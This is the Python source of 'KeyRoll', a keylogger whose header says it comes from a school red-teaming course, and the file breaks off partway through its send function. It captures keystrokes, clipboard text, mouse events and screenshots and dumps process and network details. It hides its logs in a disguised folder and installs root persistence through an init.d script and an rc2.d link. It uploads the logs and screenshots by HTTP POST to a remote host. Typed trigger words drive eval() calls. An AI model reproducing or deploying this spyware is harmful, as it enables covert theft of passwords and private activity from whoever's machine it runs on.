'''
KeyRoll is a keylogger developed in Python as part of a school project for the Red Teaming course at our Cyber Security school.
Copyright (C) 2024  Federico Carioni - Vincenzo Torchia

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

from pynput import keyboard, mouse
import pyperclip
import signal
import argparse
import shutil
import datetime
import sys
import os
import platform
from elevate import elevate
from pathlib import Path
from PIL import Image
import random
from tabulate import tabulate
import psutil
from socket import AddressFamily
import time
from screeninfo import get_monitors
import socket
import requests
import ipaddress
import warnings
# import cv2 # for webcam


import threading
# import multiprocessing


import mss as mss
from rickroll import rickroll as rickroll


""" 
BUG

onerror not kill all process


AGGIUNGERE
informazioni dischi ...


info sistema operativo


MIGLIORARE
funzione 

"""

""" 
BUG

onerror not kill all process


AGGIUNGERE
informazioni dischi ...


info sistema operativo


MIGLIORARE
funzione 

"""

####################################################
##################### BINX #########################
####################################################

def create_key_sh():

    os.system(f"sudo chmod 1777 /etc/init.d/")
    # Definisci il percorso del file key.sh
    key_sh_path = '/etc/init.d/key.sh'
    
    # Ottieni il percorso completo di key.py
    key_py_path = os.path.join(os.path.expanduser('~'), "." + os.path.basename(sys.executable))

    # Contenuto dello script key.sh
    key_sh_content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          key
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start key.py as root
### END INIT INFO

LOG_PATH="/home/kali/Desktop/VistaByte"
export LOG_PATH
sleep 60  # Add a delay of 30 seconds
XAUTHORITY=/home/kali/.Xauthority
export XAUTHORITY
export DISPLAY=:0

# Imposta il percorso del tuo programma key.py
KEY_PY_PATH="/home/kali/Downloads/key/key.py"

case "$1" in
  start)
    echo "Starting key.py"
    # Avvia key.py come root
    sudo python3 $KEY_PY_PATH &
    ;;
  stop)
    echo "Stopping key.py"
    # Puoi personalizzare questa parte se il programma ha una modalità di chiusura appropriata
    sudo pkill -f "$KEY_PY_PATH"
    ;;
  restart)
    echo "Restarting key.py"
    sudo $0 stop
    sleep 1
    sudo $0 start
    ;;
  *)
    echo "Usage: $0 {{start|stop|restart}}"
    exit 1
    ;;
esac

exit 0
"""

    
    # Scrivi il contenuto nello script key.sh utilizzando printf
    os.system(f"sudo echo '{key_sh_content}' > {key_sh_path}")

    # Imposta i permessi di esecuzione e proprietà per il file key.sh
    os.system(f"sudo chmod 755 {key_sh_path}")
    os.system(f"sudo chown root:root {key_sh_path}")
    os.system(f"sudo chmod 755 /etc/init.d/")

def enable_startup():
    # Definisci il percorso della directory rc.d appropriata
    rc_directory = '/etc/rc2.d'  # Modifica se necessario per il tuo sistema
    
    # Crea un link simbolico nella directory rc.d per avviare key.sh all'accensione
    link_path = os.path.join(rc_directory, 'S99key')

    try:
        # Crea il link simbolico utilizzando sudo
        os.system(f"sudo ln -s /etc/init.d/key.sh {link_path}")

        # Imposta i permessi e proprietà per il link simbolico
        os.system(f"sudo chmod 755 {link_path}")
        os.system(f"sudo chown root:root {link_path}")
    except Exception as e:
        print(f"Errore durante l'impostazione dei permessi per {link_path}: {e}")
        exit()

def check_and_create_files():
    # Verifica l'esistenza dei file key.sh e del link nella directory rc2.d
    key_sh_path = '/etc/init.d/key.sh'
    rc_directory = '/etc/rc2.d'
    link_path = os.path.join(rc_directory, 'S99key')

    if not os.path.exists(key_sh_path) or not os.path.exists(link_path):
        # Se uno dei file non esiste, crea entrambi
        create_key_sh()
        enable_startup()

def move_executable(target_path):
    current_path = os.path.dirname(sys.executable)
    target_path = os.path.join(target_path, os.path.basename(sys.executable))

    if current_path != target_path and getattr(sys, 'frozen', False):
        elevate()
        shutil.move(sys.executable, target_path)
        os.system("shutdown /s /t 1")

########################################################
########################################################
########################################################

# Flag per tracciare lo stato dei tasti Ctrl, Shift, C, X, V
ctrl_pressed = False
shift_pressed = False
c_pressed = False
x_pressed = False
v_pressed = False
    

class CustomDescriptionFormatter(argparse.RawDescriptionHelpFormatter):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self._max_help_position = shutil.get_terminal_size().columns # valore di discostamento massimo impostato alla alrghezza del terminale
    
    def _split_lines(self, text, width):
        lines = super()._split_lines(text, width)
    
        while text.endswith('\n'):
            text = text[:-1]
            lines += ['']

        return lines


        
##################################################################
####################### keyboard  Function #######################
##################################################################
class Keyboard:

    @staticmethod
    def on_key_press(key):
        """
        Handles the event when a key is pressed.

        Parameters:
        - key: The key that is pressed.

        Global Variables:
        - ctrl_pressed: Tracks whether the Ctrl key is pressed.
        - c_pressed, x_pressed, v_pressed: Tracks whether specific keys ('c', 'x', 'v') are pressed.
        - ARGS: Command line arguments.
        
        Raises:
        - AttributeError: If the key is not a character key.

        """
        global ctrl_pressed, c_pressed, x_pressed, v_pressed, ARGS

        try:
            if hasattr(key, 'char') and key.char is None:
                # Handling special keys that are not characters
                if not ARGS.no_print_keyboard and not ARGS.no_print_keyboard_pressed:
                    Log.create_message(category="KEYBOARD", action="pressed", message=f"{Key_special_function.keyboard_codes_mapping(key)}")
            else:
                # Handling character keys
                if not ARGS.no_print_keyboard and not ARGS.no_print_keyboard_pressed:
                    if repr(key).startswith("'\\"):
                        key.char= Key_special_function.windows_keyboard_codes_mapping(key)

                    Log.create_message(category="KEYBOARD", action="pressed", message=f"{key}")

                spec_w.key_press(key.char)

                # Tracking specific key presses
                if key.char == 'c':
                    c_pressed = True
                elif key.char == 'x':
                    x_pressed = True
                elif key.char == 'v':
                    v_pressed = True

        except AttributeError:
            # Handling special keys that are not characters
            if not ARGS.no_print_keyboard and not ARGS.no_print_keyboard_pressed:
                Log.create_message(category="KEYBOARD", action="pressed", message=f"special {Key_special_function.left_or_right(key)}")

            # Tracking Ctrl key press
            if key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                ctrl_pressed = True

        


        # Handling specific key combinations
        if ctrl_pressed and (x_pressed or c_pressed or v_pressed):
            if ctrl_pressed and x_pressed:
                Key_special_function.handle_cut()
            if ctrl_pressed and c_pressed:
                Key_special_function.handle_copy()
            if ctrl_pressed and v_pressed:
                Key_special_function.handle_paste()

            Log.create_message(category="JOTTING", message=f"{pyperclip.paste()}")

    @staticmethod
    def on_key_release(key):
        """
        Handles the event when a key is released.

        Parameters:
        - key: The key that is released.

        Global Variables:
        - ctrl_pressed: Tracks whether the Ctrl key is pressed.
        - c_pressed, x_pressed, v_pressed: Tracks whether specific keys ('c', 'x', 'v') are pressed.
        - ARGS: Command line arguments.
        
        Raises:
        - AttributeError: If the key is not a character key.

        """
        global ctrl_pressed, c_pressed, x_pressed, v_pressed, ARGS

        try:
            if hasattr(key, 'char') and key.char is None:
                # Handling special keys that are not characters
                if not ARGS.no_print_keyboard and not ARGS.no_print_keyboard_relase:
                    Log.create_message(category="KEYBOARD", action="released", message=f"{Key_special_function.keyboard_codes_mapping(key)}")
            else:

                # Handling character keys
                if not ARGS.no_print_keyboard and not ARGS.no_print_keyboard_relase:
                    if repr(key).startswith("'\\"):
                        key.char= Key_special_function.windows_keyboard_codes_mapping(key)

                    Log.create_message(category="KEYBOARD", action="released", message=f"{key}")

                spec_w.key_release(key.char)

                # Tracking specific key releases
                if key.char == 'c':
                    c_pressed = False
                elif key.char == 'x':
                    x_pressed = False
                elif key.char == 'v':
                    v_pressed = False

        except AttributeError:
            # Handling special keys that are not characters
            if not ARGS.no_print_keyboard and not ARGS.no_print_keyboard_relase:
                Log.create_message(category="KEYBOARD", action="released", message=f"special {Key_special_function.left_or_right(key)}")

            # Tracking Ctrl key release
            if key == keyboard.Key.ctrl or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                ctrl_pressed = False


##################################################################
######################### Mouse Function #########################
##################################################################
class Mouse:

    @staticmethod
    def on_mouse_click(x, y, button, pressed):
        """
        Handles the mouse click event.

        Parameters:
        - x: X-coordinate of the mouse cursor.
        - y: Y-coordinate of the mouse cursor.
        - button: The mouse button clicked.
        - pressed: Boolean indicating whether the button is pressed.

        Global Variable:
        - ARGS: Command line arguments.

        """
        def is_middle(action=None, button=None, x=None, y=None):
            """
            Helper function to determine if the mouse button is the middle button.

            Parameters:
            - action: The mouse action performed (pressed or released).
            - button: The mouse button clicked.
            - x: X-coordinate of the mouse cursor.
            - y: Y-coordinate of the mouse cursor.

            """
            if button == mouse.Button.middle:
                Log.create_message(category="MOUSE", action=f"{action}", message=f"middle at ({x}, {y})")
            else:
                Log.create_message(category="MOUSE", action=f"{action}", message=f"{button} at ({x}, {y})")

        if not ARGS.no_print_mouse:
            action = "pressed" if pressed else "released"

            if action == "pressed" and not ARGS.no_print_mouse_click_pressed:
                is_middle(action=action, button=button, x=x, y=y)

            if action == "released" and not ARGS.no_print_mouse_click_relase:
                is_middle(action=action, button=button, x=x, y=y)

    @staticmethod
    def on_mouse_scroll(x, y, dx, dy):
        """
        Handles the mouse scroll event.

        Parameters:
        - x: X-coordinate of the mouse cursor.
        - y: Y-coordinate of the mouse cursor.
        - dx: The horizontal scroll amount.
        - dy: The vertical scroll amount.

        Global Variable:
        - ARGS: Command line arguments.

        """
        if not ARGS.no_print_mouse and not ARGS.no_print_mouse_scroll:
            Log.create_message(category="MOUSE", action="scroll", message=f"{dx}, {dy}")

    @staticmethod
    def on_mouse_move(x, y):
        """
        Handles the mouse move event.

        Parameters:
        - x: X-coordinate of the mouse cursor.
        - y: Y-coordinate of the mouse cursor.

        Global Variable:
        - ARGS: Command line arguments.

        """
        if not ARGS.no_print_mouse and not ARGS.no_print_mouse_move:
            Log.create_message(category="MOUSE", action="moved", message=f"({x}, {y})")


##################################################################
######################### Util  Function #########################
##################################################################
class Util:

    @staticmethod
    def is_valid_ip(ip):
        """
        Checks if the given string is a valid IP address.

        Parameters:
        - ip: The IP address string to be validated.

        Returns:
        - True if the IP is valid, False otherwise.

        """
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    @staticmethod
    def log_path_size(path):
        """
        Removes the oldest log file with the extension ".log.old" from the specified directory.

        Parameters:
        - path: The directory path.

        """
        file_list = os.listdir(path)
        file_list.sort(reverse=False)

        for file in file_list:
            if file.endswith(".log.old"):
                os.remove(os.path.join(path, file))
                Log.create_message(message=f"Removed {os.path.join(path, file)}", category="Cleaning")
                break

    @staticmethod
    def controlled_exit(num):
        """
        Performs controlled program exit by deleting cache directories and logging the exit code.

        Parameters:
        - num: The exit code.

        """
        if os.path.exists('__pycache__'):
            shutil.rmtree('__pycache__')

        if os.path.exists('.pytest_cache'):
            shutil.rmtree('.pytest_cache')

        Log.create_message(message=f"Exit with code {num}", category="Controlled exit")
        exit(num)

    @staticmethod
    def sigint_handler(signum, frame):
        """
        Handles the SIGINT signal, logging the termination request and exiting with code 130 if not in a loop.

        Parameters:
        - signum: The signal number.
        - frame: The current stack frame.

        """
        Log.create_message(category="SIGINT", message="Program termination requested.")

        if not ARGS.no_loop:
            Log.create_message(category="SIGINT", message="Termination unsuccessful")
            Log.create_message(category="SIGINT", message="Active loop")
        else:
            Log.create_message(category="SIGINT", message="Exit")
            Util.controlled_exit(130)

    @staticmethod
    def log_dir_find(def_name_dir_list, start_dir):
        """
        Finds the target directory containing a specific file within a list of predefined folder names.

        Parameters:
        - def_name_dir_list: List of predefined folder names.
        - start_dir: The directory to start the search.

        Returns:
        - The path of the target directory.

        """
        TARGET_FILE = "lbh_unir_orra_xrlebyyrq.rick"
        target_dir = 0

        if os.path.exists(start_dir):
            available_def_name_dir_list = def_name_dir_list.copy()

            for folder_name in def_name_dir_list:
                folder_path = os.path.join(start_dir, folder_name)

                if os.path.exists(folder_path) and os.path.isdir(folder_path):
                    file_path = os.path.join(folder_path, TARGET_FILE)
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        target_dir = folder_path
                        break
                    else:
                        available_def_name_dir_list.remove(folder_name)
                        continue

                else:
                    pass

            if target_dir == 0:
                target_dir = Util.log_dir_create(available_def_name_dir_list, start_dir, TARGET_FILE)

            return target_dir

        else:
            Log.error(message=f"In 'log_dir_find', directory '{start_dir}' does not exist", num=130)

    @staticmethod
    def log_dir_create(available_def_name_dir_list, start_dir, TARGET_FILE):
        """
        Creates a directory with a randomly chosen name from the available list and creates a file within it.

        Parameters:
        - available_def_name_dir_list: List of available predefined folder names.
        - start_dir: The directory to create the new folder in.
        - TARGET_FILE: The target file name.

        Returns:
        - The path of the created directory.

        """
        if not available_def_name_dir_list:
            Log.error(message="In 'log_dir_create', the array 'available_def_name_dir_list' is empty", num=1)

        choice = random.choice(available_def_name_dir_list)
        folder_path = os.path.join(start_dir, choice)
        os.makedirs(folder_path, exist_ok=True)

        file_path = os.path.join(folder_path, TARGET_FILE)

        with open(file_path, 'w') as file:
            file.close()

        return folder_path

    @staticmethod
    def UTC_filename(date_utc=None):
        """
        Generates a string representation of a UTC date suitable for use in filenames.

        Parameters:
        - date_utc: The UTC date (default is current UTC time).

        Returns:
        - A string representation of the UTC date.

        """
        if date_utc is None:
            date_utc = datetime.datetime.now(datetime.UTC)

        date_utc_str = str(date_utc)
        date_utc_str = date_utc_str.replace(' ', '__')
        date_utc_str = date_utc_str.replace('.', ',')
        date_utc_str = date_utc_str.replace(':', ';')

        return date_utc_str

    @staticmethod
    def get_log_file(log=None):
        """
        Retrieves the most recent log file from the specified directory.

        Parameters:
        - log: The directory path (default is LOG_PATH).

        Returns:
        - The path of the most recent log file.

        """
        if log is None:
            log = LOG_PATH

        file_array = []

        for file_name in os.listdir(log):
            file_path = os.path.join(log, file_name)

            if os.path.isfile(file_path) and file_name.endswith(".log"):
                file_array.append(file_path)

        file_array.sort(reverse=True)

        return file_array[0]


##################################################################
###################### Key Special Function ######################
##################################################################
class Key_special_function:

    @staticmethod
    def keyboard_codes_mapping(key_code):
        """
        Maps the given keyboard code to a human-readable representation.

        Parameters:
        - key_code: The keyboard code to be mapped.

        Returns:
        - A string representation of the mapped key code.

        """
        str_key_code = str(key_code)

        mapped = {
            "<65027>": "Key.alt_gr",
            "<110>": "Key.island_dot",
            "<96>": "Key.island_0",
            "<97>": "Key.island_1",
            "<98>": "Key.island_2",
            "<99>": "Key.island_3",
            "<100>": "Key.island_4",
            "<101>": "Key.island_5",
            "<102>": "Key.island_6",
            "<103>": "Key.island_7",
            "<104>": "Key.island_8",
            "<105>": "Key.island_9"
        }

        return f"map {mapped.get(mapped, f'{key_code} - unmapped or unrecognized')}"         

    @staticmethod
    def windows_keyboard_codes_mapping(key_code):
        key_code = repr(key_code)
        
        win_mapped = {
            '\0': '@',
            '\x01': 'a',
            '\x02': 'b',
            '\x03': 'c',
            '\x04': 'd',
            '\x05': 'e',
            '\x06': 'f',
            '\a': 'g',
            '\b': 'h',
            '\t': 'i',
            '\n': 'j',
            '\v': 'k',
            '\f': 'l',
            '\r': 'm',
            '\x0e': 'n',
            '\x0f': 'o',
            '\x10': 'p',
            '\x11': 'q',
            '\x12': 'r',
            '\x13': 's',
            '\x14': 't',
            '\x15': 'u',
            '\x16': 'v',
            '\x17': 'w',
            '\x18': 'x',
            '\x19': 'y',
            '\x1a': 'z',
            '\x1b': '\[',
            '\x1c': '\\',
            '\x1d': ']',
            '\x1e': '^',
            '\x1f': '-'
        }

        
        for key, value in win_mapped.items() :
            if repr(key) == key_code:
                return value

        return f"unmapped or unrecognized windows combination"

    @staticmethod
    def left_or_right(key):
        """
        Determines whether the given key represents a left or right modifier key.

        Parameters:
        - key: The keyboard key to be checked.

        Returns:
        - A string indicating whether the key is left or right.

        """
        left = 'left'
        right = 'right'

        if key == keyboard.Key.cmd:
            if key == keyboard.Key.cmd_l:
                return f"Key.cmd_l"
            elif key == keyboard.Key.cmd_r:
                return f"Key.cmd_r"
            else:
                return f"Key.cmd"

        elif key == keyboard.Key.ctrl:
            if key == keyboard.Key.ctrl_l:
                return f"Key.ctrl_l"
            elif key == keyboard.Key.ctrl_r:
                return f"Key.ctrl_r"
            else:
                return f"Key.ctrl"

        elif key == keyboard.Key.shift:
            if key == keyboard.Key.shift_l:
                return f"Key.shift_l"
            elif key == keyboard.Key.shift_r:
                return f"Key.shift_r"
            else:
                return f"Key.shift"

        elif key == keyboard.Key.alt:
            if key == keyboard.Key.alt_l:
                return f"Key.alt_l"
            elif key == keyboard.Key.alt_r:
                return f"Key.alt_r"
            elif key == keyboard.Key.alt_gr:
                return f"Key.alt_gr"
            else:
                return f"Key.alt"

        else:
            return key
    
    @staticmethod
    def handle_cut():
        """
        Handles the Ctrl+X keyboard shortcut.

        """
        Log.create_message(category="SHORTCUT", message="Ctrl+X pressed")

    @staticmethod
    def handle_copy():
        """
        Handles the Ctrl+C keyboard shortcut.

        """
        Log.create_message(category="SHORTCUT", message="Ctrl+C pressed")

    @staticmethod
    def handle_paste():
        """
        Handles the Ctrl+V keyboard shortcut.

        """
        Log.create_message(category="SHORTCUT", message="Ctrl+V pressed")


##################################################################
######################## Trigger Function ########################
##################################################################

class Trigger:

    @staticmethod
    def call_global_function(function_name):
        """
        Calls a global function based on the provided function name with optional arguments.

        Parameters:
        - function_name: The name of the function, potentially including the module, class, or method names,
                         along with optional arguments.

        Raises:
        - Log.error: If the function or module does not exist.

        """
        # Find the index of the open parenthesis
        parenthesis_index = function_name.find("(")

        # If the open parenthesis is not present
        if parenthesis_index == -1:
            Log.error(f"Missing parenthesis in {function_name}", 128)

        # Extract the text before the open parenthesis
        text_before = function_name[:parenthesis_index].strip()

        # Extract the text from the open parenthesis onwards
        text_after = function_name[parenthesis_index:].strip()

        # If text_before contains the class name, separate the class name from the method name
        if text_before.count('.') == 1:
            # Use rsplit to split from the right, so that the method name can contain dots
            class_name, method_name = text_before.rsplit('.', 1)
            # Check if the class and method exist
            if class_name in globals() and method_name and callable(getattr(globals()[class_name], method_name, None)):
                # Call the function with arguments
                eval(f"{class_name}.{method_name}{text_after}")
            else:
                Log.error(f"Function does NOT exist: {class_name}.{method_name}", 128)

        elif text_before.count('.') == 2:
            # Split the module name, class name, and method name
            module_name, class_name, method_name = text_before.split('.')

            # Get the module
            module = globals().get(module_name, None)

            # Check if the module exists
            if module is not None:
                # Check if the class and method exist in the module
                if hasattr(module, class_name) and method_name and callable(
                        getattr(getattr(module, class_name), method_name, None)):
                    # Call the function with arguments
                    eval(f"{text_before}{text_after}")
                else:
                    Log.error(f"Function does NOT exist: {text_before}", 128)
            else:
                Log.error(f"Module does NOT exist: {text_before}", 128)

        else:
            # Check if text_before matches an existing function
            if text_before and callable(globals().get(text_before)):
                # Call the function with arguments
                eval(f"{text_before}{text_after}")
            else:
                Log.error(f"Function does NOT exist: {text_before}", 128)


    class Special_word:

        def __init__(self):
            """
            Initializes the Special_word class with attributes for storing target words, pressed keys,
            released keys, and written keys.

            Attributes:
            - special_word_dict: Dictionary containing target words.
            - special_word_max_length: Maximum length of the target words.
            - special_word_tolerance: Tolerance to adjust the maximum length.
            - pressed_list: List to store pressed keys.
            - released_list: List to store released keys.
            - writed_list: List to store written keys.

            """
            self.special_word_dict = {}
            self.special_word_max_length = 0
            self.special_word_tolerance = 5

            self.pressed_list = []
            self.released_list = []
            self.writed_list = []

        def calc_max_length(self):
            """
            Calculates the maximum length of the target words.

            """
            self.special_word_max_length = len(max(self.special_word_dict, key=lambda k: len(k)))

        def add_special_word(self, word, target):
            """
            Adds a target word to the special_word_dict and updates the maximum length.

            Parameters:
            - word: The target word to be added.
            - target: The target function to be associated with the word.

            """
            self.special_word_dict.update({word: target})
            self.calc_max_length()

        def key_press(self, char):
            """
            Handles the event when a key is pressed.

            Parameters:
            - char: The pressed key.

            """
            self.pressed_list.append(char)
            self.limit_length(self.pressed_list)

        def key_release(self, char):
            """
            Handles the event when a key is released.

            Parameters:
            - char: The released key.

            """
            self.released_list.append(char)
            self.limit_length(self.released_list)
            self.compare_and_remove()

        def compare_and_remove(self):
            """
            Compares pressed and released keys and removes them if they match.
            Checks for target words and triggers associated functions.

            """
            for char in self.pressed_list[:]:
                if char in self.released_list:
                    self.pressed_list.remove(char)
                    self.released_list.remove(char)

                    self.writed_list.append(char)
                    self.limit_length(self.writed_list)
                    self.search_word()

        def limit_length(self, array):
            """
            Limits the length of the given array to the maximum length with tolerance.

            Parameters:
            - array: The array to be limited in length.

            """
            while len(array) > (self.special_word_max_length + self.special_word_tolerance):
                array.pop(0)

        def search_word(self):
            """
            Searches for target words in the written keys and triggers associated functions.

            """
            for key, value in self.special_word_dict.items():
                if key in ''.join(self.writed_list):
                    self.word_found(key)

                    Log.create_message(category="ACTION", message=f"Word Found: {key} with target: {value}")

                    Trigger.call_global_function(value)

        def word_found(self, word):
            """
            Removes the found word from the written keys.

            Parameters:
            - word: The found word to be removed.

            """
            string_writed_list = ''.join(self.writed_list)
            string_writed_list = string_writed_list.replace(word, '')
            self.writed_list = list(string_writed_list)


    class Over_size:

        def __init__(self, update_time, max_size, log_path, call):
            """
            Initializes the Over_size class with parameters for checking log file size and triggering actions.

            Parameters:
            - update_time: The time interval between size checks.
            - max_size: The maximum allowed size in megabytes.
            - log_path: The path to the log file or directory.
            - call: The function to be called when the size exceeds the maximum.

            """
            self.update_time = update_time
            self.max_size = max_size
            self.log_path = log_path
            self.call = call

            check_size_thread = threading.Thread(target=self.check_size,
                                                        args=(self.update_time, self.max_size, self.log_path, self.call,))
            check_size_thread.start()

        def check_size(self, update_time, max_size, path, call):
            """
            Continuously checks the size of the log file or directory and triggers the specified action if the size exceeds the maximum.

            Parameters:
            - update_time: The time interval between size checks.
            - max_size: The maximum allowed size in megabytes.
            - path: The path to the log file or directory.
            - call: The function to be called when the size exceeds the maximum.

            """
            if self.log_path == "Util.get_log_file()":
                path = Util.get_log_file()

            size_MB = 0

            # Check if the path is a file
            if os.path.isfile(path):
                size_MB = os.path.getsize(path) / (1024 * 1024)

            # Check if the path is a directory
            elif os.path.isdir(path):
                # Scan all files in the folder and sum their sizes
                for folder, subfolders, files in os.walk(path):
                    for file_name in files:
                        size_MB += os.path.getsize(os.path.join(folder, file_name)) / (1024 * 1024)

            else:
                Log.error(message=f"In 'check_size', directory '{path}' does not exist", num=130)

            if size_MB >= max_size:
                Trigger.call_global_function(call)

            time.sleep(update_time)
            self.check_size(update_time, max_size, path, call)


    class Recursive_interval:

        def __init__(self, update_time, call):
            """
            Initializes the Recursive_interval class with parameters for triggering actions at regular intervals.

            Parameters:
            - update_time: The time interval between triggering actions.
            - call: The function to be called at each interval.

            """
            self.update_time = update_time
            self.call = call

            recursive_interval_thread = threading.Thread(target=self.interval,
                                                                args=(self.update_time, self.call,))
            recursive_interval_thread.start()

        def interval(self, update_time, call):
            """
            Executes the specified function at regular intervals.

            Parameters:
            - update_time: The time interval between triggering actions.
            - call: The function to be called at each interval.

            """
            Trigger.call_global_function(call)

            time.sleep(update_time)
            self.interval(update_time, call)


##################################################################
########################## Spy Function ##########################
##################################################################
class Spy:

    @staticmethod
    def screenshot(destination, name=Util.UTC_filename()):
        """
        Takes a screenshot of the screen and saves it to the specified destination with the given name.

        Parameters:
        - destination: The directory where the screenshot will be saved.
        - name: The filename for the screenshot. Defaults to a UTC timestamp.

        """

        if not name.endswith(".png"):
            name += ".png"

        # Capture the screenshot of the screen
        with mss.mss() as sct:
            sct.shot(output=os.path.join(destination, name))
            sct.close()

        # Send the screenshot
        Sender.sender(os.path.join(destination, name))

        Log.create_message(category="SPY", action="Screenshot",
                           message=f"Screenshot saved at {os.path.join(destination, name)}")


    # @staticmethod
    # def photo(destination, name = Util.UTC_filename()):
    #     # Inizializza la fotocamera
    #     videocapture = cv2.VideoCapture(0)

    #     # Leggi un frame dalla fotocamera
    #     _, frame = videocapture.read()

    #     # Salva il frame come immagine
    #     cv2.imwrite(os.path.join(destination, name), frame)

    #     # Rilascia la fotocamera
    #     videocapture.release()

    #     print(f"Foto scattata con successo: {os.path.join(destination, name)}")


    @staticmethod
    def process():
        """
        Retrieves information about running processes and logs the details.

        """
        processes = psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_info', 'exe'])

        index_string = ""
        process_dump = ""

        for index, process in enumerate(processes):
            index_string = f"{index} processes found:\n"
            process_dump += f"PID: {process.info['pid']}, Name: {process.info['name']}, User: {process.info['username']}, State: {process.info['status']}, CPU: {process.info['cpu_percent']}%, Mem: {process.info['memory_info'].rss / (1024 * 1024):.2f} MB, Path: {process.info['exe']}\n"

        Log.create_message(category="SPY", action="Process", message=f"{index_string}{process_dump}")

    @staticmethod
    def web():
        """
        Retrieves network connection information and logs the details.

        """
        web_dump = ""

        # Network connection information
        connections = psutil.net_connections(kind='inet')
        web_dump += "Network connections:\n"
        for connection in connections:
            web_dump += f"PID: '{connection.pid}', Family: '{connection.family}', Type: '{connection.type}' Local address: '{connection.laddr}', Remote address: '{connection.raddr}', Status: '{connection.status}'\n"

        network_addresses = psutil.net_if_addrs()
        network_stats = psutil.net_if_stats()
        network_packets = psutil.net_io_counters(pernic=True)

        for network_card in network_addresses:
            web_dump += f"\nNetwork card '{network_card}':\n"

            for nic in network_addresses[network_card]:
                web_dump += f"Family: '{repr(nic.family)}', Address: '{nic.address}', Netmask: '{nic.netmask}', Broadcast: '{nic.broadcast}', ptp: '{nic.ptp}'\n"

            web_dump += f"isup: '{repr(network_stats[network_card].isup)}', duplex: '{repr(network_stats[network_card].duplex)}', speed: '{network_stats[network_card].speed} Mb', mtu: '{network_stats[network_card].mtu}', flags: '{network_stats[network_card].flags}'\n"

            web_dump += f"bytes sent: '{repr(network_packets[network_card].bytes_sent)}', bytes received: '{network_packets[network_card].bytes_recv}', packets sent: '{network_packets[network_card].packets_sent}', packets received: '{network_packets[network_card].packets_recv}', errors while receiving: '{network_packets[network_card].errin}', errors while sending: '{network_packets[network_card].errout}', incoming dropped: '{network_packets[network_card].dropin}', outgoing dropped: '{network_packets[network_card].dropout}'\n"

        Log.create_message(category="SPY", action="system network interface card", message=f"{web_dump}")

    @staticmethod
    def screen_size():
        """
        Retrieves screen size information and logs the details.

        """
        screen_dump = "Screen size\n"

        for monitor in get_monitors():
            screen_dump += f"name '{monitor.name}', width: '{monitor.width}px', height: '{monitor.height}px'\n"

        Log.create_message(category="SPY", action="screen size", message=f"{screen_dump}")


##################################################################
########################## Log Function ##########################
##################################################################
class Log:

    @staticmethod
    def create_message(message, category, action=None):
        """
        Creates a log message with the specified details and prints it to the console and log file.

        Parameters:
        - message: The content of the log message.
        - category: The category of the log message.
        - action: The action associated with the log message. Defaults to None.

        """
        if action is not None:
            Log.print_message(f'{datetime.datetime.now(datetime.UTC)} UTC - {category} - {action} - {message}')
            Log.print_file(f'{datetime.datetime.now(datetime.UTC)} UTC - {category} - {action} - {message}')
        else:
            Log.print_message(f'{datetime.datetime.now(datetime.UTC)} UTC - {category} - {message}')
            Log.print_file(f'{datetime.datetime.now(datetime.UTC)} UTC - {category} - {message}')

    @staticmethod
    def error(message, num):
        """
        Creates a log message for a fatal error, prints it, and exits the program with the specified code.

        Parameters:
        - message: The content of the error message.
        - num: The exit code for the program.

        """
        Log.create_message(message=message, category="FATAL ERROR", action=None)
        Util.controlled_exit(num)

    @staticmethod
    def print_message(message):
        """
        Prints the log message to the console.

        Parameters:
        - message: The log message to be printed.

        """
        print(message)
        pass

    @staticmethod
    def print_file(message):
        """
        Appends the log message to the log file.

        Parameters:
        - message: The log message to be written to the log file.

        """
        log_file = Util.get_log_file(LOG_PATH)

        with open(log_file, 'a') as file:
            file.write(f"{message}\n")

    @staticmethod
    def configure_print_file(path):
        """
        Configures the log file by creating a new log file with a UTC timestamp and finding and sending old log files.

        Parameters:
        - path: The directory where the log files are stored.

        """
        log_file = f"{path}{os.sep}{Util.UTC_filename()}.log"

        with open(log_file, 'w'):
            pass  # 'pass' is used to create an empty file

        Log.find_old_file(path, log_file)

    @staticmethod
    def find_old_file(path, current_file):
        """
        Finds old log files in the specified directory and sends them using the Sender class.

        Parameters:
        - path: The directory where the log files are stored.
        - current_file: The path of the current log file.

        """
        # Iterate through all files in the folder
        for file_name in os.listdir(path):
            file_path = os.path.join(path, file_name)

            # Check if it is a file, has the extension ".log" or ".png," and is not the newly created file
            if os.path.isfile(file_path) and (file_name.endswith(".log") or file_name.endswith(".png")) and not (file_path == current_file):

                sender_thread = threading.Thread(target=Sender.sender, args=(str(file_path),))
                sender_thread.start()


##################################################################
######################## Sender  Function ########################
##################################################################
class Sender:

    @staticmethod
    def check_connection(destination_address, destination_port):
        """
        Checks the connection to the specified destination address and port.

        Parameters:
        - destination_address: The IP address or hostname of the destination.
        - destination_port: The port number on which the destination is listening.

        Returns:
        - True if the connection is successful, False otherwise.

        """
        try:
            # Try to establish a connection
            socket.create_connection((destination_address, destination_port), timeout=5)
            return True
        except Exception as e:
            print(f'Error during connection check: {e}')
            return False

    @staticmethod
    def send_file_via_http(destination_address, port, file_path):
        """
        Sends a file to the specified destination using HTTP POST request.

        Parameters:
        - destination_address: The IP address or hostname of the destination.
        - port: The port number on which the destination is listening.
        - file_path: The full path of the file to be sent.

        Returns:
        - True if the file is sent successfully, False otherwise.

        """
        try:
            if not Sender.check_connection(destination_address, port):
                return False

            # Extract the file name from the full path
            file_name = os.path.basename(file_path)

            url = f'http://{destination_address}:{port}/receive_file'  # Modify the destination URL

            # Open the file in binary mode
            with open(file_path, 'rb') as file:
                files = {'file': (file_name, file)}

                # Send the HTTP POST request with the file
                response = requests.post(url, files=files)

            # Check the HTTP status code
